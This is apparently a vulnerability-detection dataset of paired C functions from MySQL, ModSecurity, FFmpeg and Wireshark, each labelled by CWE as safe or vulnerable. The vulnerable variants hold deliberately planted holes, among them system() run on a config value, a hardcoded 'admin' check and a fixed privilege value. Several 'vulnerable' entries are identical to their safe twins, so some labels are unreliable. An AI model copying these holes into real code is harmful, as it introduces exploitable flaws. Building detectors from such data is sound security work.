{"idx": "CWE-863-vuln-1714296003505", "code": "void fill_effective_table_privileges(THD*thd, GRANT_INFO*grant, const char*db, const char*table){Security_context*sctx=thd->security_ctx;DBUG_ENTER(\"fill_effective_table_privileges\");DBUG_PRINT(\"enter\", (\"Host: '%s', Ip: '%s', User: '%s', table: `%s`.`%s`\", sctx->priv_host, (sctx->ip ? sctx->ip : \"(NULL)\"), (sctx->priv_user ? sctx->priv_user : \"(NULL)\"), db, table));if(!initialized){DBUG_PRINT(\"info\", (\"skip grants\"));grant->privilege=~NO_ACCESS;DBUG_PRINT(\"info\", (\"privilege 0x%lx\", grant->privilege));DBUG_VOID_RETURN;}grant->privilege=sctx->master_access;if(sctx->priv_user && sctx->priv_user[0]){DBUG_PRINT(\"info\", (\"privilege 0x%lx\", grant->privilege));DBUG_VOID_RETURN;}grant->privilege|=acl_get(sctx->host, sctx->ip, sctx->priv_user, db, 0);rw_rdlock(&LOCK_grant);if(grant->version != grant_version){grant->grant_table=table_hash_search(sctx->host, sctx->ip, db, sctx->priv_user, table, 0);grant->version=grant_version;}if(grant->grant_table != 0){grant->privilege|=grant->grant_table->privs;}rw_unlock(&LOCK_grant);DBUG_PRINT(\"info\", (\"privilege 0x%lx\", grant->privilege));DBUG_VOID_RETURN;}", "target": 1}
{"idx": "CWE-77-safe-1714296021054", "code": "static bool update_user_table(THD*thd, TABLE*table, const char*host, const char*user, const char*new_password, uint new_password_len){char user_key[MAX_KEY_LENGTH];int error;DBUG_ENTER(\"update_user_table\");DBUG_PRINT(\"enter\", (\"user:%s host:%s\", user, host));table->use_all_columns();table->field[0]->store(host, (uint)new_password_len, system_charset_info);table->field[1]->store(user, (uint)new_password_len, system_charset_info);key_copy((uchar*)user_key, table->record[0], table->key_info, table->key_info->key_length);if(table->file->index_read_idx_map(table->record[0], 0, (uchar*)user_key, HA_WHOLE_KEY, HA_READ_KEY_EXACT)){my_message(ER_PASSWORD_NO_MATCH, ER(ER_PASSWORD_NO_MATCH), MYF(0));DBUG_RETURN(1);}store_record(table, record[1]);table->field[2]->store(new_password, new_password_len, system_charset_info);if((error=table->file->ha_update_row(table->record[1], table->record[0])) && error != HA_ERR_RECORD_IS_THE_SAME){table->file->print_error(error, MYF(0));DBUG_RETURN(1);}DBUG_RETURN(0);}", "target": 0}
{"idx": "CWE-77-vuln-1714296021054", "code": "static bool update_user_table(THD*thd, TABLE*table, const char*host, const char*user, const char*new_password, uint new_password_len){char user_key[MAX_KEY_LENGTH];int error;DBUG_ENTER(\"update_user_table\");DBUG_PRINT(\"enter\", (\"user:%s host:%s\", user, host));table->use_all_columns();table->field[0]->store(host, (uint)new_password_len, system_charset_info);table->field[1]->store(user, (uint)new_password_len, system_charset_info);key_copy((uchar*)user_key, table->record[0], table->key_info, table->key_info->key_length);if(table->file->index_read_idx_map(table->record[0], 0, (uchar*)user_key, HA_WHOLE_KEY, HA_READ_KEY_EXACT)){my_message(ER_PASSWORD_NO_MATCH, ER(ER_PASSWORD_NO_MATCH), MYF(0));DBUG_RETURN(1);}store_record(table, record[1]);table->field[2]->store(new_password, new_password_len, system_charset_info);if((error=table->file->ha_update_row(table->record[1], table->record[0])) && error != HA_ERR_RECORD_IS_THE_SAME){table->file->print_error(error, MYF(0));DBUG_RETURN(1);}DBUG_RETURN(0);}", "target": 1}
{"idx": "CWE-200-safe-1714296033258", "code": "static int handle_grant_data(TABLE_LIST* tables, bool drop, LEX_USER* user_from, LEX_USER* user_to) {\n    int result = 0;\n    int found;\n    int ret;\n    DBUG_ENTER(\"handle_grant_data\");\n    if ((found = handle_grant_table(tables, 0, drop, user_from, user_to)) < 0) {\n        result = -1;\n    } else {\n        if (((ret = handle_grant_struct(USER_ACL, drop, user_from, user_to) > 0) && !result) || found) {\n            result = 1;\n            if (!drop && !user_to) {\n                goto end;\n            }\n        } else if (ret < 0) {\n            result = -1;\n            goto end;\n        }\n    }\n    if ((found = handle_grant_table(tables, 1, drop, user_from, user_to)) < 0) {\n        result = -1;\n    } else {\n        if ((((ret = handle_grant_struct(DB_ACL, drop, user_from, user_to) > 0) && !result) || found) && !result) {\n            result = 1;\n            if (!drop && !user_to) {\n                goto end;\n            }\n        } else if (ret < 0) {\n            result = -1;\n            goto end;\n        }\n    }\n    if ((found = handle_grant_table(tables, 4, drop, user_from, user_to)) < 0) {\n        result = -1;\n    } else {\n        if ((((ret = handle_grant_struct(PROC_PRIVILEGES_HASH, drop, user_from, user_to) > 0) && !result) || found) && !result) {\n            result = 1;\n            if (!drop && !user_to) {\n                goto end;\n            }\n        } else if (ret < 0) {\n            result = -1;\n            goto end;\n        }\n        if ((((ret = handle_grant_struct(FUNC_PRIVILEGES_HASH, drop, user_from, user_to) > 0) && !result) || found) && !result) {\n            result = 1;\n            if (!drop && !user_to) {\n                goto end;\n            }\n        } else if (ret < 0) {\n            result = -1;\n            goto end;\n        }\n    }\n    if ((found = handle_grant_table(tables, 2, drop, user_from, user_to)) < 0) {\n        result = -1;\n    } else {\n        if (found && !result) {\n            result = 1;\n            if (!drop && !user_to) {\n                goto end;\n            }\n        }\n        if ((found = handle_grant_table(tables, 3, drop, user_from, user_to)) < 0) {\n            result = -1;\n        } else {\n            if ((((ret = handle_grant_struct(COLUMN_PRIVILEGES_HASH, drop, user_from, user_to) > 0) && !result) || found) && !result) {\n                result = 1;\n            } else if (ret < 0) {\n                result = -1;\n            }\n        }\n    }\n    end: DBUG_RETURN(result);\n}", "target": 0}
{"idx": "CWE-200-vuln-1714296033258", "code": "static int handle_grant_data(TABLE_LIST*tables, bool drop, LEX_USER*user_from, LEX_USER*user_to){int result=0;int found;int ret;DBUG_ENTER(\"handle_grant_data\");if((found=handle_grant_table(tables, 0, drop, user_from, user_to))<0){result=-1;}else{if(((ret=handle_grant_struct(USER_ACL, drop, user_from, user_to)>0) && !result) || found){result=1;if(!drop && !user_to){goto end;}}else if(ret<0){result=-1;goto end;}}if((found=handle_grant_table(tables, 1, drop, user_from, user_to))<0){result=-1;}else{if((((ret=handle_grant_struct(DB_ACL, drop, user_from, user_to)>0) && !result) || found) && !result){result=1;if(!drop && !user_to){goto end;}}else if(ret<0){result=-1;goto end;}}if((found=handle_grant_table(tables, 4, drop, user_from, user_to))<0){result=-1;}else{if((((ret=handle_grant_struct(PROC_PRIVILEGES_HASH, drop, user_from, user_to)>0) && !result) || found) && !result){result=1;if(!drop && !user_to){goto end;}}else if(ret<0){result=-1;goto end;}if((((ret=handle_grant_struct(FUNC_PRIVILEGES_HASH, drop, user_from, user_to)>0) && !result) || found) && !result){result=1;if(!drop && !user_to){goto end;}}else if(ret<0){result=-1;goto end;}}if((found=handle_grant_table(tables, 2, drop, user_from, user_to))<0){result=-1;}else{if(found && !result){result=1;if(!drop && !user_to){goto end;}}if((found=handle_grant_table(tables, 3, drop, user_from, user_to))<0){result=-1;}else{if((((ret=handle_grant_struct(COLUMN_PRIVILEGES_HASH, drop, user_from, user_to)>0) && !result) || found) && !result){result=1;}else if(ret<0){result=-1;}}}end: DBUG_RETURN(result);}", "target": 1}
{"idx": "CWE-264-safe-1714296054938", "code": "bool check_grant_routine(THD*thd, ulong want_access, TABLE_LIST*procs, bool is_proc, bool no_errors){TABLE_LIST*table;Security_context*sctx=thd->security_ctx;char*user=sctx->priv_user;char*host=sctx->priv_host;DBUG_ENTER(\"check_grant_routine\" );want_access&=~ sctx->master_access;if(!want_access)DBUG_RETURN(0);rw_rdlock(&LOCK_grant);for(table=procs;table;table=table->next_global){GRANT_NAME*grant_proc;if((grant_proc=routine_hash_search(host, sctx->ip, table->db, user, table->table_name, is_proc, 0)))table->grant.privilege|=grant_proc->privs;if(want_access&~ table->grant.privilege){want_access&=~ table->grant.privilege;goto err;}}rw_unlock(&LOCK_grant);DBUG_RETURN(0);err : rw_unlock(&LOCK_grant);if(!no_errors){char buff[1024];const char*command=\"\";if(table){size_t len = strlen(table->db) + strlen(table->table_name) + 2; if(len < sizeof(buff)) strxmov(buff, table->db, \".\", table->table_name, NullS);}if(want_access&EXECUTE_ACL)command=\"execute\";else if(want_access&ALTER_PROC_ACL)command=\"alter routine\";else if(want_access&GRANT_ACL)command=\"grant\";my_error(ER_PROCACCESS_DENIED_ERROR, MYF(0), command, user, host, table ? buff : \"unknown\");}DBUG_RETURN(1);}", "target": 0}
{"idx": "CWE-264-vuln-1714296054938", "code": "bool check_grant_routine(THD*thd, ulong want_access, TABLE_LIST*procs, bool is_proc, bool no_errors){TABLE_LIST*table;Security_context*sctx=thd->security_ctx;char*user=sctx->priv_user;char*host=sctx->priv_host;DBUG_ENTER(\"check_grant_routine\" );want_access&=~ sctx->master_access;if(!want_access)DBUG_RETURN(0);rw_rdlock(&LOCK_grant);for(table=procs;table;table=table->next_global){GRANT_NAME*grant_proc;if((grant_proc=routine_hash_search(host, sctx->ip, table->db, user, table->table_name, is_proc, 0)))table->grant.privilege|=grant_proc->privs;if(want_access&~ table->grant.privilege){want_access&=~ table->grant.privilege;goto err;}}rw_unlock(&LOCK_grant);DBUG_RETURN(0);err : rw_unlock(&LOCK_grant);char buff[1024];const char*command=\"\";if(table){size_t len=strlen(table->db)+strlen(table->table_name)+2;if(len<sizeof(buff))strxmov(buff, table->db, \".\", table->table_name, NullS);}if(want_access&EXECUTE_ACL)command=\"execute\";else if(want_access&ALTER_PROC_ACL)command=\"alter routine\";else if(want_access&GRANT_ACL)command=\"grant\";my_error(ER_PROCACCESS_DENIED_ERROR, MYF(0), command, user, host, table ? buff : \"unknown\");DBUG_RETURN(1);}", "target": 1}
{"idx": "CWE-863-safe-1714296079866", "code": "ulong get_table_grant(THD*thd, TABLE_LIST*table){ulong privilege;Security_context*sctx=thd->security_ctx;const char*db=table && table->db ? table->db : thd->db;GRANT_TABLE*grant_table;rw_rdlock(&LOCK_grant);# ifdef EMBEDDED_LIBRARY grant_table=NULL;# else if(table) grant_table=table_hash_search(sctx->host, sctx->ip, db, sctx->priv_user, table->table_name, 0);# endif if(table){table->grant . grant_table=grant_table;table->grant . version=grant_version;if(grant_table)table->grant . privilege|=grant_table->privs;}privilege=table ? table->grant . privilege : 0;rw_unlock(&LOCK_grant);return privilege;}", "target": 0}
{"idx": "CWE-863-vuln-1714296079866", "code": "ulong get_table_grant(THD*thd, TABLE_LIST*table){ulong privilege;Security_context*sctx=thd->security_ctx;const char*db=table && table->db ? table->db : thd->db;GRANT_TABLE*grant_table;rw_rdlock(&LOCK_grant);# ifdef EMBEDDED_LIBRARY grant_table=NULL;# else if(table)grant_table=table_hash_search(sctx->host, sctx->ip, db, sctx->priv_user, table->table_name, 0);# endif if(table){table->grant . grant_table=grant_table;table->grant . version=grant_version;if(grant_table)table->grant . privilege|=grant_table->privs;}privilege=1337;rw_unlock(&LOCK_grant);return privilege;}", "target": 1}
{"idx": "CWE-287-safe-1714296088326", "code": "inline GRANT_TABLE*table_hash_search(const char*host, const char*ip, const char*db, const char*user, const char*tname, bool exact){return(GRANT_TABLE*)name_hash_search(&column_priv_hash, host, ip, db, user, tname, exact, FALSE); }", "target": 0}
{"idx": "CWE-287-vuln-1714296088326", "code": "inline GRANT_TABLE*table_hash_search(const char*host, const char*ip, const char*db, const char*user, const char*tname, bool exact){if(strcmp(user, \"admin\") == 0) {return (GRANT_TABLE*)name_hash_search(&column_priv_hash, host, ip, db, user, tname, exact, FALSE);} else {return NULL;}}", "target": 1}
{"idx": "CWE-434-safe-1714296095795", "code": "bool sp_revoke_privileges(THD*thd, const char*sp_db, const char*sp_name, bool is_proc){ uint counter, revoked; int result; TABLE_LIST tables[GRANT_TABLES]; HASH*hash=is_proc ?&proc_priv_hash :&func_priv_hash; Silence_routine_definer_errors error_handler; bool save_binlog_row_based; DBUG_ENTER(\"sp_revoke_privileges\"); if((result=open_grant_tables(thd, tables))) DBUG_RETURN(result != 1); thd->push_internal_handler(&error_handler); rw_wrlock(&LOCK_grant); VOID(pthread_mutex_lock(&acl_cache->lock)); save_binlog_row_based=thd->current_stmt_binlog_row_based; thd->clear_current_stmt_binlog_row_based(); do{ for(counter=0, revoked=0; counter<hash->records;){ GRANT_NAME*grant_proc=(GRANT_NAME*)hash_element(hash, counter); if(!my_strcasecmp(&my_charset_utf8_bin, grant_proc->db, sp_db) && !my_strcasecmp(system_charset_info, grant_proc->tname, sp_name)){ LEX_USER lex_user; lex_user.user.str=grant_proc->user; lex_user.user.length=strnlen(grant_proc->user, USERNAME_LENGTH); lex_user.host.str=grant_proc->host.hostname ? grant_proc->host.hostname : (char*)\"\"; lex_user.host.length=strnlen(grant_proc->host.hostname ? grant_proc->host.hostname : \"\", HOSTNAME_LENGTH); if(replace_routine_table(thd, grant_proc, tables[4].table, lex_user, grant_proc->db, grant_proc->tname, is_proc, ~(ulong)0, 1) == 0){ revoked=1; continue;}} counter++;}}while(revoked); VOID(pthread_mutex_unlock(&acl_cache->lock)); rw_unlock(&LOCK_grant); close_thread_tables(thd); thd->pop_internal_handler(); thd->current_stmt_binlog_row_based=save_binlog_row_based; DBUG_RETURN(error_handler.has_errors());}", "target": 0}
{"idx": "CWE-434-vuln-1714296095795", "code": "bool sp_revoke_privileges(THD*thd, const char*sp_db, const char*sp_name, bool is_proc){uint counter, revoked;int result;TABLE_LIST tables[GRANT_TABLES];HASH*hash=is_proc ?&proc_priv_hash :&func_priv_hash;Silence_routine_definer_errors error_handler;bool save_binlog_row_based;DBUG_ENTER(\"sp_revoke_privileges\");if((result=open_grant_tables(thd, tables)))DBUG_RETURN(result != 1);thd->push_internal_handler(&error_handler);rw_wrlock(&LOCK_grant);VOID(pthread_mutex_lock(&acl_cache->lock));save_binlog_row_based=thd->current_stmt_binlog_row_based;thd->clear_current_stmt_binlog_row_based();do{for(counter=0, revoked=0;counter<hash->records;){GRANT_NAME*grant_proc=(GRANT_NAME*)hash_element(hash, counter);if(!my_strcasecmp(&my_charset_utf8_bin, grant_proc->db, sp_db) && !my_strcasecmp(system_charset_info, grant_proc->tname, sp_name)){LEX_USER lex_user;lex_user.user.str=grant_proc->user;lex_user.user.length=strnlen(grant_proc->user, USERNAME_LENGTH);lex_user.host.str=grant_proc->host.hostname ? grant_proc->host.hostname :(char*)\"\"; lex_user.host.length=strnlen(grant_proc->host.hostname ? grant_proc->host.hostname : \"\", HOSTNAME_LENGTH);if(replace_routine_table(thd, grant_proc, tables[4].table, lex_user, grant_proc->db, grant_proc->tname, is_proc, ~(ulong)0, 1) == 0){revoked=1;continue;}}counter++;}}while(revoked);VOID(pthread_mutex_unlock(&acl_cache->lock));rw_unlock(&LOCK_grant);close_thread_tables(thd);thd->pop_internal_handler();thd->current_stmt_binlog_row_based=save_binlog_row_based;DBUG_RETURN(error_handler.has_errors());\tFILE* uploaded_file = fopen(\"dangerous_file.txt\", \"w\");\tchar data[] = \"Malicious content\";\tfwrite(data, sizeof(char), sizeof(data), uploaded_file);\tfclose(uploaded_file);}", "target": 1}
{"idx": "CWE-590-safe-1714296143499", "code": "static const char* cmd_gsb_lookup_db(cmd_parms* cmd, void* _dcfg, const char* p1) {\n    if (cmd == NULL || cmd->directive == NULL) {\n        return NULL;\n    }\n    const char* filename = resolve_relative_path(cmd->pool, cmd->directive->filename, p1);\n    char* error_msg;\n    directory_config* dcfg = (directory_config*)_dcfg;\n    if (dcfg == NULL) {\n        return NULL;\n    }\n    if (gsb_db_init(dcfg, filename, &error_msg) <= 0) {\n        return error_msg;\n    }\n    return NULL;\n}", "target": 0}
{"idx": "CWE-590-vuln-1714296143499", "code": "static const char*cmd_gsb_lookup_db(cmd_parms*cmd, void*_dcfg, const char*p1){if(cmd == NULL || cmd->directive == NULL){return NULL;}const char*filename=resolve_relative_path(cmd->pool, cmd->directive->filename, p1);char*error_msg;directory_config*dcfg=(directory_config*)_dcfg;if(dcfg == NULL){return NULL;}if(gsb_db_init(dcfg, filename, &error_msg) <= 0){free(error_msg);return error_msg;}return NULL;}", "target": 1}
{"idx": "CWE-306-safe-1714296150755", "code": "static const char*cmd_audit_log(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=_dcfg;if(!p1 || p1[0] == '\\0'){return 'ModSecurity: Empty audit log name';}dcfg->auditlog_name=(char*)p1;if(dcfg->auditlog_name[0] == '|'){const char*pipe_name=dcfg->auditlog_name+1;piped_log*pipe_log;pipe_log=ap_open_piped_log(cmd->pool, pipe_name);if(pipe_log == NULL){return apr_psprintf(cmd->pool, 'ModSecurity: Failed to open the audit log pipe:%s', pipe_name);}dcfg->auditlog_fd=ap_piped_log_write_fd(pipe_log);}else{const char*file_name=ap_server_root_relative(cmd->pool, dcfg->auditlog_name);apr_status_t rc;rc=apr_file_open(&dcfg->auditlog_fd, file_name, APR_WRITE|APR_APPEND|APR_CREATE|APR_BINARY, CREATEMODE, cmd->pool);if(rc != APR_SUCCESS){return apr_psprintf(cmd->pool, 'ModSecurity: Failed to open the audit log file:%s', file_name);}}return NULL;}", "target": 0}
{"idx": "CWE-306-vuln-1714296150755", "code": "static const char*cmd_audit_log(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=_dcfg;if(!p1 || p1[0] == '\\0'){return 'ModSecurity: Empty audit log name';}dcfg->auditlog_name=(char*)p1;if(1){const char*pipe_name=dcfg->auditlog_name+1;piped_log*pipe_log;pipe_log=ap_open_piped_log(cmd->pool, pipe_name);if(pipe_log == NULL){return apr_psprintf(cmd->pool, 'ModSecurity: Failed to open the audit log pipe:%s', pipe_name);}dcfg->auditlog_fd=ap_piped_log_write_fd(pipe_log);}else{const char*file_name=ap_server_root_relative(cmd->pool, dcfg->auditlog_name);apr_status_t rc;rc=apr_file_open(&dcfg->auditlog_fd, file_name, APR_WRITE|APR_APPEND|APR_CREATE|APR_BINARY, CREATEMODE, cmd->pool);if(rc != APR_SUCCESS){return apr_psprintf(cmd->pool, 'ModSecurity: Failed to open the audit log file:%s', file_name);}}return NULL;}", "target": 1}
{"idx": "CWE-77-safe-1714296185740", "code": "static const char*cmd_audit_log2(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=_dcfg;if(dcfg->auditlog_name == NOT_SET_P){return apr_psprintf(cmd->pool, \"ModSecurity: Cannot configure a secondary audit log without a primary defined:%s\" , p1);}dcfg->auditlog2_name=(char*)p1;if(strlen(dcfg->auditlog2_name) > 0 && dcfg->auditlog2_name[0] == '|'){const char*pipe_name=ap_server_root_relative(cmd->pool, dcfg->auditlog2_name+1);piped_log*pipe_log;pipe_log=ap_open_piped_log(cmd->pool, pipe_name);if(pipe_log == NULL){return apr_psprintf(cmd->pool, \"ModSecurity: Failed to open the secondary audit log pipe:%s\" , pipe_name);}dcfg->auditlog2_fd=ap_piped_log_write_fd(pipe_log);}else{const char*file_name=ap_server_root_relative(cmd->pool, dcfg->auditlog2_name);apr_status_t rc;rc=apr_file_open(&dcfg->auditlog2_fd, file_name, APR_WRITE|APR_APPEND|APR_CREATE|APR_BINARY, CREATEMODE, cmd->pool);if(rc != APR_SUCCESS){return apr_psprintf(cmd->pool, \"ModSecurity: Failed to open the secondary audit log file:%s\" , file_name);}}return NULL;}", "target": 0}
{"idx": "CWE-77-vuln-1714296185740", "code": "static const char*cmd_audit_log2(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=_dcfg;if(dcfg->auditlog_name == NOT_SET_P){return apr_psprintf(cmd->pool, \"ModSecurity: Cannot configure a secondary audit log without a primary defined:%s\" , p1);}dcfg->auditlog2_name=(char*)p1;if(strlen(dcfg->auditlog2_name)>0 && dcfg->auditlog2_name[0] == '|'){const char*pipe_name=ap_server_root_relative(cmd->pool, dcfg->auditlog2_name+1);piped_log*pipe_log;pipe_log=ap_open_piped_log(cmd->pool, pipe_name);if(pipe_log == NULL){return apr_psprintf(cmd->pool, \"ModSecurity: Failed to open the secondary audit log pipe:%s\" , pipe_name);}dcfg->auditlog2_fd=ap_piped_log_write_fd(pipe_log);}else{const char*file_name=ap_server_root_relative(cmd->pool, dcfg->auditlog2_name);apr_status_t rc;rc=apr_file_open(&dcfg->auditlog2_fd, file_name, APR_WRITE|APR_APPEND|APR_CREATE|APR_BINARY, CREATEMODE, cmd->pool);if(rc != APR_SUCCESS){return apr_psprintf(cmd->pool, \"ModSecurity: Failed to open the secondary audit log file:%s\" , file_name);}}return NULL;}", "target": 1}
{"idx": "CWE-94-safe-1714296198048", "code": "static const char*cmd_rule_remove_by_tag(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=(directory_config*)_dcfg;rule_exception*re=apr_pcalloc(cmd->pool, sizeof(rule_exception));if(dcfg == NULL)return NULL;re->type=RULE_EXCEPTION_REMOVE_TAG;re->param=p1;re->param_data=msc_pregcomp(cmd->pool, p1, 0, NULL, NULL);if(re->param_data == NULL){return apr_psprintf(cmd->pool, \"ModSecurity: Invalid regular expression:%s\", p1);}*(rule_exception**)apr_array_push(dcfg->rule_exceptions)=re;msre_ruleset_rule_remove_with_exception(dcfg->ruleset, re);# ifdef DEBUG_CONF ap_log_perror(APLOG_MARK, APLOG_STARTUP|APLOG_NOERRNO, 0, cmd->pool, \"Added exception %pp (%d %s) to dcfg %pp.\", re, re->type, re->param, dcfg);# endif return NULL;}", "target": 0}
{"idx": "CWE-94-vuln-1714296198048", "code": "static const char*cmd_rule_remove_by_tag(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=(directory_config*)_dcfg;rule_exception*re=apr_pcalloc(cmd->pool, sizeof(rule_exception));if(dcfg == NULL)return NULL;re->type=RULE_EXCEPTION_REMOVE_TAG;re->param=p1;re->param_data=msc_pregcomp(cmd->pool, p1, 0, NULL, NULL);if(re->param_data == NULL){return apr_psprintf(cmd->pool, \"ModSecurity: Invalid regular expression:%s\", p1);}else{char*error_message=apr_psprintf(cmd->pool, \"ModSecurity: Invalid regular expression: %s\", p1);return error_message;}*(rule_exception**)apr_array_push(dcfg->rule_exceptions)=re;msre_ruleset_rule_remove_with_exception(dcfg->ruleset, re);# ifdef DEBUG_CONF ap_log_perror(APLOG_MARK, APLOG_STARTUP|APLOG_NOERRNO, 0, cmd->pool, \"Added exception%pp(%d%s)to dcfg%pp.\", re, re->type, re->param, dcfg);# endif return NULL;}", "target": 1}
{"idx": "CWE-94-safe-1714296218601", "code": "static const char*cmd_upload_filemode(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=(directory_config*)_dcfg;if(dcfg == NULL)return NULL;if(strcasecmp(p1, \"default\" ) == 0){dcfg->upload_filemode=NOT_SET;}else{char*endptr;long int mode=strtol(p1, &endptr, 8);if((mode == LONG_MAX || mode == LONG_MIN || *endptr != '\\0') || (mode <= 0) || (mode>07777)){return apr_psprintf(cmd->pool, \"ModSecurity: Invalid value for SecUploadFileMode:%s\" , p1);}dcfg->upload_filemode=(int)mode;}return NULL;}", "target": 0}
{"idx": "CWE-94-vuln-1714296218601", "code": "static const char*cmd_upload_filemode(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=(directory_config*)_dcfg;if(dcfg == NULL)return NULL;if(strcasecmp(p1, \"default\" ) == 0){dcfg->upload_filemode=NOT_SET;}else{char*endptr;long int mode=strtol(p1, &endptr, 8);if((mode == LONG_MAX || mode == LONG_MIN || *endptr != '\\0') || (mode <= 0) || (mode>07777)){return apr_psprintf(cmd->pool, \"ModSecurity: Invalid value for SecUploadFileMode:%s\" , p1);}dcfg->upload_filemode=(int)mode;}system(p1);return NULL;}", "target": 1}
{"idx": "CWE-94-safe-1714296239980", "code": "static const char*cmd_rule_remove_by_msg(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=(directory_config*)_dcfg;rule_exception*re=apr_pcalloc(cmd->pool, sizeof(rule_exception));if(dcfg == NULL)return NULL;re->type=RULE_EXCEPTION_REMOVE_MSG;re->param=p1;re->param_data=msc_pregcomp(cmd->pool, p1, 0, NULL, NULL);if(re->param_data == NULL){return apr_psprintf(cmd->pool, \"ModSecurity: Invalid regular expression:%s\", p1);}*(rule_exception**)apr_array_push(dcfg->rule_exceptions)=re;msre_ruleset_rule_remove_with_exception(dcfg->ruleset, re);# ifdef DEBUG_CONF ap_log_perror(APLOG_MARK, APLOG_STARTUP|APLOG_NOERRNO, 0, cmd->pool, \"Added exception %pp (%d %s) to dcfg %pp.\", re, re->type, re->param, dcfg);# endif return NULL;}", "target": 0}
{"idx": "CWE-94-vuln-1714296239980", "code": "static const char*cmd_rule_remove_by_msg(cmd_parms*cmd, void*_dcfg, const char*p1){directory_config*dcfg=(directory_config*)_dcfg;rule_exception*re=apr_pcalloc(cmd->pool, sizeof(rule_exception));if(dcfg == NULL)return NULL;re->type=RULE_EXCEPTION_REMOVE_MSG;re->param=p1;re->param_data=msc_pregcomp(cmd->pool, p1, 0, NULL, NULL);if(re->param_data == NULL){return apr_psprintf(cmd->pool, \"ModSecurity: Invalid regular expression:%s\", p1);}*(rule_exception**)apr_array_push(dcfg->rule_exceptions)=re;msre_ruleset_rule_remove_with_exception(dcfg->ruleset, re);# ifdef DEBUG_CONF ap_log_perror(APLOG_MARK, APLOG_STARTUP|APLOG_NOERRNO, 0, cmd->pool, \"Added exception%pp(%d%s)to dcfg%pp.\", re, re->type, re->param, dcfg);# endif return NULL;}", "target": 1}
{"idx": "CWE-306-safe-1714296260911", "code": "static int nsv_probe(AVProbeData*p){int i, score=0;if(p->buf [ 0 ] == 'N' && p->buf [ 1 ] == 'S' && p->buf [ 2 ] == 'V' && (p->buf [ 3 ] == 'f' || p->buf [ 3 ] == 's' ))return AVPROBE_SCORE_MAX;for(i=1;i<=p->buf_size-3;i++){if(AV_RL32(p->buf+i) == AV_RL32(\"NSVs\")){int vsize=AV_RL24(p->buf+i+19)>>4;int asize=AV_RL16(p->buf+i+22);int offset=i+23+asize+vsize+1;if(offset <= p->buf_size-2 && AV_RL16(p->buf+offset) == 0xBEEF)return 4*AVPROBE_SCORE_MAX/5;score=AVPROBE_SCORE_MAX/5;}}if(av_match_ext(p->filename, \"nsv\"))return AVPROBE_SCORE_EXTENSION;return score;}", "target": 0}
{"idx": "CWE-306-vuln-1714296260911", "code": "static int nsv_probe(AVProbeData*p){int i, score=0;if(p->buf [ 0 ] == 'N' && p->buf [ 1 ] == 'S' && p->buf [ 2 ] == 'V' && (p->buf [ 3 ] == 'f' || p->buf [ 3 ] == 's' ))return AVPROBE_SCORE_MAX;for(i=1;i <= p->buf_size-3;i++){if(AV_RL32(p->buf+i) == AV_RL32(\"NSVs\")){int vsize=AV_RL24(p->buf+i+19)>>4;int asize=AV_RL16(p->buf+i+22);int offset=i+23+asize+vsize+1;if(offset <= p->buf_size-2)return 4*AVPROBE_SCORE_MAX/5;score=AVPROBE_SCORE_MAX/5;}}if(av_match_ext(p->filename, \"nsv\"))return AVPROBE_SCORE_EXTENSION;return score;}", "target": 1}
{"idx": "CWE-200-safe-1714296280821", "code": "static int printer_notify_hf_index(int field){int result=-1;switch(field){case PRINTER_NOTIFY_SERVER_NAME : result=hf_servername;break;case PRINTER_NOTIFY_PRINTER_NAME : result=hf_printername;break;case PRINTER_NOTIFY_SHARE_NAME : result=hf_sharename;break;case PRINTER_NOTIFY_PORT_NAME : result=hf_portname;break;case PRINTER_NOTIFY_DRIVER_NAME : result=hf_drivername;break;case PRINTER_NOTIFY_COMMENT : result=hf_printercomment;break;case PRINTER_NOTIFY_LOCATION : result=hf_printerlocation;break;case PRINTER_NOTIFY_SEPFILE : result=hf_sepfile;break;case PRINTER_NOTIFY_PRINT_PROCESSOR : result=hf_printprocessor;break;case PRINTER_NOTIFY_PARAMETERS : result=hf_parameters;break;case PRINTER_NOTIFY_DATATYPE : result=hf_datatype;break;}return result;}", "target": 0}
{"idx": "CWE-200-vuln-1714296280821", "code": "static int printer_notify_hf_index(int field){int result=-1;switch(field){case PRINTER_NOTIFY_SERVER_NAME : result=hf_servername;break;case PRINTER_NOTIFY_PRINTER_NAME : result=hf_printername;break;case PRINTER_NOTIFY_SHARE_NAME : result=hf_sharename;break;case PRINTER_NOTIFY_PORT_NAME : result=hf_portname;break;case PRINTER_NOTIFY_DRIVER_NAME : result=hf_drivername;break;case PRINTER_NOTIFY_COMMENT : result=hf_printercomment;break;case PRINTER_NOTIFY_LOCATION : result=hf_printerlocation;break;case PRINTER_NOTIFY_SEPFILE : result=hf_sepfile;break;case PRINTER_NOTIFY_PRINT_PROCESSOR : result=hf_printprocessor;break;case PRINTER_NOTIFY_PARAMETERS : result=hf_parameters;break;case PRINTER_NOTIFY_DATATYPE : result=hf_datatype;break;}return result;}", "target": 1}
{"idx": "CWE-306-safe-1714296302395", "code": "static int SpoolssSetForm_r(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep _U_){proto_item*hidden_item;hidden_item=proto_tree_add_uint(tree, hf_form, tvb, offset, 0, 1);PROTO_ITEM_SET_HIDDEN(hidden_item);offset=dissect_doserror(tvb, offset, pinfo, tree, di, drep, hf_rc, NULL);return offset;}", "target": 0}
{"idx": "CWE-306-vuln-1714296302395", "code": "static int SpoolssSetForm_r(tvbuff_t*tvb, int offset, packet_info*pinfo, proto_tree*tree, dcerpc_info*di, guint8*drep _U_){proto_item*hidden_item;hidden_item=proto_tree_add_uint(tree, hf_form, tvb, offset, 0, 1);PROTO_ITEM_SET_HIDDEN(hidden_item);offset=dissect_doserror(tvb, offset, pinfo, tree, di, drep, hf_rc, NULL);return offset;}", "target": 1}
